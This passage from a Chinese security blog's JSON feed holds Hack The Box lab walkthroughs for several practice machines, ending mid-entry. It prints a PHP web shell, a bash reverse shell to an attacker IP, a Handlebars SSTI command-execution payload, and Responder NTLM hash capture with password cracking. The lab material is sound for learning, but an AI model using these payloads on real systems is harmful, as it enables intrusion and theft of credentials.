class=\"code\"><pre><span class=\"line\">c =[71,71,81,63,79,64,43,40,41,41,112,65,35,86,83,101,98,77,96,91,74,93,88,71,90,85,68,73,68,85,90,93,0,1,2,3,4,3,2,1]</span><br><span class=\"line\"></span><br><span class=\"line\">offset = ord(&#x27;H&#x27;) - c[0]</span><br><span class=\"line\"></span><br><span class=\"line\">for i in range(0, len(c)):</span><br><span class=\"line\"></span><br><span class=\"line\">    print(chr(c[i]+i+offset),end=&#x27;&#x27;)</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HITCTF2023&#123;M0dbus_so_so_so_easy&#125;!#%&#x27;))))</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "流量"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/HTB%20Keeper/",
            "url": "https://nnnpc.github.io/2024/04/16/HTB%20Keeper/",
            "title": "HTB Keeper",
            "date_published": "2024-04-16T05:58:19.003Z",
            "content_html": "<h1 id=\"htb-keeper\"><a class=\"markdownIt-Anchor\" href=\"#htb-keeper\">#</a> HTB Keeper</h1>\n<p>fscan 进行扫描</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20240206185853261.png\" alt=\"\"></p>\n<p>发现开放了 80 和 22 端口，访问下看看</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20240206190639789.png\" alt=\"\"></p>\n<p>/etc/hosts 设置下</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20240206190914984.png\" alt=\"\"></p>\n<p>发现目标路径是个登录口</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20240206192247347.png\" alt=\"\"></p>\n<p>搜索到默认的用户名密码，尝试进行登录</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20240206192357348.png\" alt=\"\"></p>\n<p>成功登录，并在 Admin-&gt;Users-&gt;Select 找到如上界面</p>\n<p>在 lnorgaard 用户的详情界面找到了备注的 pass</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20240206193001832.png\" alt=\"\"></p>\n<p>进行 ssh 登录</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20240206193026525.png\" alt=\"\"></p>\n<p>在该目录下起一个 python 服务，本地 wget 将 zip 文件下载下来</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20240206195214189.png\" alt=\"\"></p>\n<p>经过搜索知道是个 keepass 的 cve</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21hdHJvN3NoL2tlZXBhc3MtZHVtcC1tYXN0ZXJrZXk=\">https://github.com/matro7sh/keepass-dump-masterkey</span></p>\n<p>利用脚本对 dmp 文件解密出密码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20240206200759914.png\" alt=\"\"></p>\n<p>经过搜索得知</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20240206201932990.png\" alt=\"\"></p>\n<p>是一种粥的名称，全称为 Rødgrød med fløde</p>\n<p>安装 keepassx，apt install 即可</p>\n<p>将 rødgrød med fløde 作为密码打开另一个文件</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20240206202303296.png\" alt=\"\"></p>\n<p>在里面寻找到了 PuTTY-User-Key-File 文件</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20240206202440507.png\" alt=\"\"></p>\n<p>利用 puttygen 生成私钥</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">puttygen 1.txt -O private-openssh -o id_rsa</span><br></pre></td></tr></table></figure>\n<p>1.txt 中的内容就是刚才得到的密钥文件</p>\n<p>生成 id_rsa 之后，利用 id_rsa 进行 ssh 连接</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh -i id_rsa root@keeper.htb</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20240206203103603.png\" alt=\"\"></p>\n<p><strong>总结：本台靶机的考点在于 keepassx 的一个 CVE 和利用 puttygen 生成私钥进行 ssh 连接</strong></p>\n",
            "tags": [
                "渗透"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/HTB%201%E5%B1%82/",
            "url": "https://nnnpc.github.io/2024/04/16/HTB%201%E5%B1%82/",
            "title": "HTB 1层",
            "date_published": "2024-04-16T05:58:19.001Z",
            "content_html": "<h1 id=\"htb-1层\"><a class=\"markdownIt-Anchor\" href=\"#htb-1层\">#</a> HTB 1 层</h1>\n<h2 id=\"appointment\"><a class=\"markdownIt-Anchor\" href=\"#appointment\">#</a> Appointment</h2>\n<p>fscan 扫描</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231207200225184.png\" alt=\"\"></p>\n<p>发现开放了 80 端口，浏览器访问 ip</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231207200321995.png\" alt=\"\"></p>\n<p>看到登录框尝试进行 sql 注入</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231207200348276.png\" alt=\"\"></p>\n<p>注入成功</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231207200411746.png\" alt=\"\"></p>\n<p><strong>总结：本台靶机的考点就是普通的 sql 注入，用单引号闭合前面的语句并且使用 #注释 pass 成功实现注入</strong></p>\n<h2 id=\"sequel\"><a class=\"markdownIt-Anchor\" href=\"#sequel\">#</a> Sequel</h2>\n<p>fscan 进行扫描</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231207201135816.png\" alt=\"\"></p>\n<p>发现 3306 端口开放，3306 是 mysql 数据库的常用端口，用命令进行连接</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql -uroot -h 10.129.214.75</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231207201530166.png\" alt=\"\"></p>\n<p>接下来就是正常的 sql 语句查询的操作了，flag 在 config 表中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">show databases;</span><br><span class=\"line\">use htb;</span><br><span class=\"line\">show tables;</span><br><span class=\"line\">select * from config;</span><br></pre></td></tr></table></figure>\n<p><strong>总结：该台靶机的考点就在于 3306 端口开放的 mysql 服务，通过命令无密码连接之后利用 sql 语句去查找表中的字段值</strong></p>\n<h2 id=\"crocodile\"><a class=\"markdownIt-Anchor\" href=\"#crocodile\">#</a> Crocodile</h2>\n<p>fscan 扫描</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231207202509139.png\" alt=\"\"></p>\n<p>21 端口开放了 ftp 服务，并且扫描结果已经显示出来了 anonymous 可以免密登录</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231207202927003.png\" alt=\"\"></p>\n<p>同上面扫描结果显示的一样，有 allowed.userlist、allowed.userlist.passwd 两个文件，都 get 下来</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231207203137843.png\" alt=\"\"></p>\n<p>能看到是对应的用户名密码，并且这台靶机除了开放 21 端口外还开放了 80 端口，有 web 服务，访问看看</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231207203314506.png\" alt=\"\"></p>\n<p>dirsearch 或者 gobuster 扫描一下目录</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 ./dirsearch.py -u 10.129.1.15</span><br><span class=\"line\">gobuster dir --url http://10.129.1.15 -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -x .php</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231207203557223.png\" alt=\"\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231207203623181.png\" alt=\"\"></p>\n<p>发现登录口 login.php，访问</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231207203742590.png\" alt=\"\"></p>\n<p>用上之前 ftp 得到的 admin 用户和密码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">admin </span><br><span class=\"line\">rKXM59ESxesUFHAd</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231207203841875.png\" alt=\"\"></p>\n<p>后台直接显示 flag</p>\n<p><strong>总结：这台靶机的考点主要还是在 ftp 登录和传输文件，将 web 端的后台登陆账号密码放在了默认无密码用户登录的 ftp 当中，登录后台获取 flag</strong></p>\n<h2 id=\"responder\"><a class=\"markdownIt-Anchor\" href=\"#responder\">#</a> Responder</h2>\n<p>fscan 扫描</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208160335360.png\" alt=\"\"></p>\n<p>开放了 80 端口，web 端访问一下</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208161936675.png\" alt=\"\"></p>\n<p>发现重定向到域名解析失败，修改 /etc/hosts，添加</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">10.129.189.214 unika.htb</span><br></pre></td></tr></table></figure>\n<p>刷新访问成功</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208162218597.png\" alt=\"\"></p>\n<p>这里需要用到 responder 设置监听来伪造服务端，详细说明一下</p>\n<p>如果客户端 / 目标无法通过 DNS 域名解析，则会回退到 LLMNR (在 Windows<br>\nVista 中入) 和 NBT-NS 进行解析</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LLMNR (链路本地多播名称解析): 多播方式查找网络上的主机，其它主机响应IP，然后连接</span><br><span class=\"line\">NetBIOS(NBT-NS网络名称服务): 将主机的广播请求发送到本地子网，如果其它主机存在该名称，就响应。</span><br></pre></td></tr></table></figure>\n<p>这两种协议都是基于信任的，只有目标主机才会相应，但是攻击者可以冒充被请求的主机发出响应，windows 主机之间有多种认证方式，这里使用的是 NTLM 协议</p>\n<p>因此可以梳理一下本题抓取 hash 大致流程：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.先在本地设置responder监听</span><br><span class=\"line\">2.利用漏洞进行本地文件包含，但目标无法通过NDS域名解析，回退到两个协议</span><br><span class=\"line\">3.LLMNR与NBT-NS配合进行广播寻找，这是监听的responder发出了相应</span><br><span class=\"line\">4.根据ntlm的认证流程，先后收到了来自目标机子的username、domainname以及用目标机子密码hash加密的伪造responder机子传输过去的challenge（作为respond）</span><br><span class=\"line\">5.获取hash使用john进行爆破</span><br></pre></td></tr></table></figure>\n<p>对 ntlm 认证过程不了解的可以去看看另一篇（NTLM 协议流量解密）</p>\n<p>知道了大致流程原理之后进行操作，先设置监听</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">responder -I tun0</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208170545546.png\" alt=\"\"></p>\n<p>接着在浏览器进行本地文件包含的操作</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208170720288.png\" alt=\"\"></p>\n<p>伪造成功，成功抓取</p>\n<p>将 hash 保存到 hash.txt 中，使用 john 或者 hashcat 利用 rockyou 字典进行爆破</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span><br><span class=\"line\">hashcat -m 5600 hash.txt rockyou.txt -o out.txt --force</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208170946097.png\" alt=\"\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208171025425.png\" alt=\"\"></p>\n<p>得到密码 badminton</p>\n<p>fscan 端口扫描没扫全，再用 nmap 进行一次扫描</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208171405840.png\" alt=\"\"></p>\n<p>发现 5985 端口开放，上网查找能知道这个端口的常用服务是 winrm 远程管理</p>\n<p>之前已经得到了用户名和密码，配合 winrm 进行远程登录</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt-get install evil-winrm\t#安装</span><br><span class=\"line\">evil-winrm -i 靶机IP -u Administrator -p badminton #使用</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208172011795.png\" alt=\"\"></p>\n<p>flag 在 mike 用户的桌面中</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208172117681.png\" alt=\"\"></p>\n<p><strong>总结：本台靶机利用 responder 配合 5985 的 winrm 进行远程登录，需要注意的是 responder 监听抓取认证过程中用户密码 hash 的流程</strong></p>\n<h2 id=\"three\"><a class=\"markdownIt-Anchor\" href=\"#three\">#</a> Three</h2>\n<p>fscan 进行扫描</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211154029720.png\" alt=\"\"></p>\n<p>发现开放了 80 端口，浏览器进行访问</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211154637840.png\" alt=\"\"></p>\n<p>在 web 页面底端找到了带有域名的 email，添加到 /etc/hosts 访问一下</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211154818959.png\" alt=\"\"></p>\n<p>既然得到了域名，进一步进行信息搜集，爆破一下子域名</p>\n<figure class=\"highlight text\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gobuster vhost -w /usr/share/wordlists/subnames.txt -u http://thetoppers.htb</span><br></pre></td></tr></table></figure>\n<p>得到了 s3.thetoppers.htb，没有爆破成功的也可以直接看题目提示</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211160159874.png\" alt=\"\"></p>\n<p>同样先加到 /etc/hosts 当中，访问</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211160539839.png\" alt=\"\"></p>\n<p>接下来可以利用 aws 工具对 s3 的桶进行操作，并且写入木马拿到 shell</p>\n<p>安装：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt install -y awscli -y</span><br></pre></td></tr></table></figure>\n<p>配置：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">aws configure</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211161038245.png\" alt=\"\"></p>\n<p>列出所有 s3 的桶：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">aws --endpoint=http://s3.thetoppers.htb s3 ls</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211161118930.png\" alt=\"\"></p>\n<p>列出 s3 下的目录及对象：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211161223676.png\" alt=\"\"></p>\n<p>接着写入木马到文件当中，这里使用了 GET 传参的方式，用来进行远程命令执行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo &#x27;&lt;?php system($_GET[&quot;nnnpc&quot;]); ?&gt;&#x27; &gt; shell.php</span><br></pre></td></tr></table></figure>\n<p>利用 cp 命令 copy 到桶里</p>\n<figure class=\"highlight text\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211161752654.png\" alt=\"\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211161940467.png\" alt=\"\"></p>\n<p>木马被成功解析</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211162120236.png\" alt=\"\"></p>\n<p>在上一级目录中获取了 flag</p>\n<p>但对于平时的渗透过程中，光能 rce 是肯定不够的，所以需要想办法进行权限维持，这里可以配合已经上传的木马进行反弹 shell 的操作</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3huLS1zaGVsbC1mZzFoeWppMGR4MGpmeGFuM3I3djJjZnJpbnc2ai5zaA==\">先写一个可执行文件 shell.sh</span></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/bin/bash</span><br><span class=\"line\">bash -i &gt;&amp; /dev/tcp/10.10.14.66/1234 0&gt;&amp;1</span><br></pre></td></tr></table></figure>\n<p>ip 为需要反弹的 ip，也就是攻击机的 tun0</p>\n<p>这里有两种方法上传可执行文件，一种就是本地利用 python 开放个 web 端口，利用 shell.php 远程 curl 下载并执行</p>\n<p>还有一种方法就是通过 aws 同样上传，并通过 shell.php 去执行 sh 文件，这里演示第二种</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3huLS1hd3NzaGVsbC16NjVtcDJ1MXJ5Ym83YWxlOGsuc2g=\">首先 aws 同样将 shell.sh</span> copy 到桶里</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">aws --endpoint=http://s3.thetoppers.htb s3 cp shell.sh s3://thetoppers.htb</span><br></pre></td></tr></table></figure>\n<p>利用 shell.php 查看</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211163437543.png\" alt=\"\"></p>\n<p>成功上传，监听 sh 文件中的 1234 端口</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -lnvp 1234</span><br></pre></td></tr></table></figure>\n<p>利用 bash 执行 sh 文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://thetoppers.htb/shell.php?nnnpc=bash shell.sh</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211163757713.png\" alt=\"\"></p>\n<p>成功获得 shell</p>\n<p><strong>总结：本台靶机主要的知识点在 aws 命令对 s3 的桶进行操作写马，写入木马以后再进行一些反弹 shell 的权限维持操作</strong></p>\n<h2 id=\"ignition\"><a class=\"markdownIt-Anchor\" href=\"#ignition\">#</a> Ignition</h2>\n<p>fscan 扫描</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211192521642.png\" alt=\"\"></p>\n<p>80 端口开放，绑定 hosts 浏览器访问</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211192635413.png\" alt=\"\"></p>\n<p>使用 dirsearch 或 gobuster 扫描目录</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gobuster dir -u http://ignition.htb/ -w /usr/share/wordlists/dirb/common.txt</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211193800964.png\" alt=\"\"></p>\n<p>发现了 /admin 目录，访问</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211194042648.png\" alt=\"\"></p>\n<p>使用 bp 密码弱口令爆破得到 admin qwerty123</p>\n<p>登录成功即可获得 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211194339146.png\" alt=\"\"></p>\n<p><strong>总结：本题的考点主要在于目录爆破和后台账号密码的爆破</strong></p>\n<h2 id=\"bike\"><a class=\"markdownIt-Anchor\" href=\"#bike\">#</a> Bike</h2>\n<p>fscan 扫描</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211200259514.png\" alt=\"\"></p>\n<p>80 端口开放，同样进行访问</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211200322195.png\" alt=\"\"></p>\n<p>测试发现存在 ssti 模板注入</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211200429873.png\" alt=\"\"></p>\n<p>payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;#with &quot;s&quot; as |string|&#125;&#125;  &#123;&#123;#with &quot;e&quot;&#125;&#125;  &#123;&#123;#with split as |conslist|&#125;&#125;  &#123;&#123;this.pop&#125;&#125;  &#123;&#123;this.push (lookup string.sub &quot;constructor&quot;)&#125;&#125;  &#123;&#123;this.pop&#125;&#125;  &#123;&#123;#with string.split as |codelist|&#125;&#125;  &#123;&#123;this.pop&#125;&#125;  &#123;&#123;this.push &quot;return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat /root/flag.txt&#x27;);&quot;&#125;&#125;  &#123;&#123;this.pop&#125;&#125;  &#123;&#123;#each conslist&#125;&#125;  &#123;&#123;#with (string.sub.apply 0 codelist)&#125;&#125;  &#123;&#123;this&#125;&#125;  &#123;&#123;/with&#125;&#125;  &#123;&#123;/each&#125;&#125;  &#123;&#123;/with&#125;&#125;  &#123;&#123;/with&#125;&#125;  &#123;&#123;/with&#125;&#125;  &#123;&#123;/with&#125;&#125;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211200631890.png\" alt=\"\"></p>\n<p><strong>总结：本台靶机主要是利用了 ssti 模板注入比较普通的注入链子</strong></p>\n<h2 id=\"funnel\"><a class=\"markdownIt-Anchor\" href=\"#funnel\">#</a> Funnel</h2>\n<p>fscan 扫描</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211201622266.png\" alt=\"\"></p>\n<p>发现开放了 21 端口 ftp 服务</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211201814607.png\" alt=\"\"></p>\n<p>anonymous 用户名空密码登录并发现了 mail_backup 文件夹</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211201903381.png\" alt=\"\"></p>\n<p>get 文件夹中的两个文件</p>\n<p>并且在 pdf 中发现了较为关键的默认密码：funnel123#!#</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211202113397.png\" alt=\"\"></p>\n<p>在 welcome 文件中发现了 5 个目的用户名</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211202217352.png\" alt=\"\"></p>\n<p>结合刚才的 22 开放端口，尝试遍历这五个用户名和默认密码</p>\n<p>最终在 christine 用户登录成功</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh christine@10.129.228.195</span><br></pre></td></tr></table></figure>\n<p>检查哪些端口在执行本地监听</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ss -tln</span><br></pre></td></tr></table></figure>\n<p>检查在端口上默认运行的服务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ss -tl</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211202822023.png\" alt=\"\"></p>\n<p>发现 5432 端口运行了 postgresql 服务</p>\n<p>可以通过 psql 进行连接操作</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211203106559.png\" alt=\"\"></p>\n<p>但发现远程主机并没有该工具并且现在所拥有的权限不足以去下载工具</p>\n<p>这里就利用 ssh 搭建隧道，实现本地端口的转发</p>\n<p>这里理解一下本地端口转发：实质上就是在客户机指定端口上分配一个套接字侦听器，当连接到该端口时，客户机会将现有的 ssh 会话发送到远程服务器的端口，</p>\n<p>该隧道将网络流量从本地端口转发到了远程端口，使本地执行的命令能够通过 ssh 隧道转发到远程进行执行</p>\n<p>接下来使用 ssh 搭建隧道</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh -L 1234:localhost:5432 christine@10.129.228.195</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211203856868.png\" alt=\"\"></p>\n<p>直接在本地下载 psql 工具并访问本地的 1234 端口</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211204024063.png\" alt=\"\"></p>\n<p>成功通过 ssh 隧道实现本地端口转发，连接了远程 postgresql 服务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\\l # \\list缩写，列出现有数据库，按q退出</span><br><span class=\"line\">\\c secrets # 连接数据库</span><br><span class=\"line\">\\dt #查看数据库中的表</span><br><span class=\"line\">select * from flag;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231211204452664.png\" alt=\"\"></p>\n<p><strong>总结：本台靶机主要的知识点在于利用 ssh 搭建隧道实现本地端口转发，解决远程主机无法使用 psql 的问题</strong></p>\n<h2 id=\"pennyworth\"><a class=\"markdownIt-Anchor\" href=\"#pennyworth\">#</a> Pennyworth</h2>\n<p>fscan 扫描</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231212130240155.png\" alt=\"\"></p>\n<p>发现 8080 端口开放，浏览器访问</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231212130346242.png\" alt=\"\"></p>\n<p>发现登录口，弱口令爆破得到</p>\n<figure class=\"highlight plaintext\"><table><tr><td 